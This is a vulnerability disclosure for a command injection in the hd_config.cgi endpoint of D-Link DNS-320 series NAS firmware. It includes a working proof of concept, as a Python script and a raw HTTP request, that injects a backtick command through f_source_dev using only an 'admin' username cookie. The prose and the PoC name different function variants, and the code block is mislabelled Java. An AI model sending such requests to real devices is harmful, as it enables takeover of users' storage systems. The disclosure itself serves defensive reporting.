# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_FMT_Std2R5_1st_DiskMGR function of the file /cgi-bin/hd_config.cgi.  The variable `f_source_dev`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 43 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736876772-6d599001-1c4f-4bc3-bbbb-ec626b5a1692.png#averageHue=%23fbfaf9&clientId=u970bf91e-c803-4&from=paste&height=203&id=ude007197&originHeight=203&originWidth=1059&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39578&status=done&style=none&taskId=ubf33f57b-6aae-403c-b2a7-04757840bf1&title=&width=1059)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736871362-fb3ecbbc-3d1f-4927-8708-c37f3be887b8.png#averageHue=%23fefefb&clientId=u970bf91e-c803-4&from=paste&height=121&id=u97c30f42&originHeight=121&originWidth=1231&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23285&status=done&style=none&taskId=ucd4e05ea-a8f7-4039-a216-4370c1eb82b&title=&width=1231)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/hd_config.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_FMT_Std2R5_2nd_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/0000`&f_file_system=1&f_newly_dev=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```
POST /cgi-bin/hd_config.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 108
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_FMT_Std2R5_2nd_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/0000`&f_file_system=1&f_newly_dev=1
```

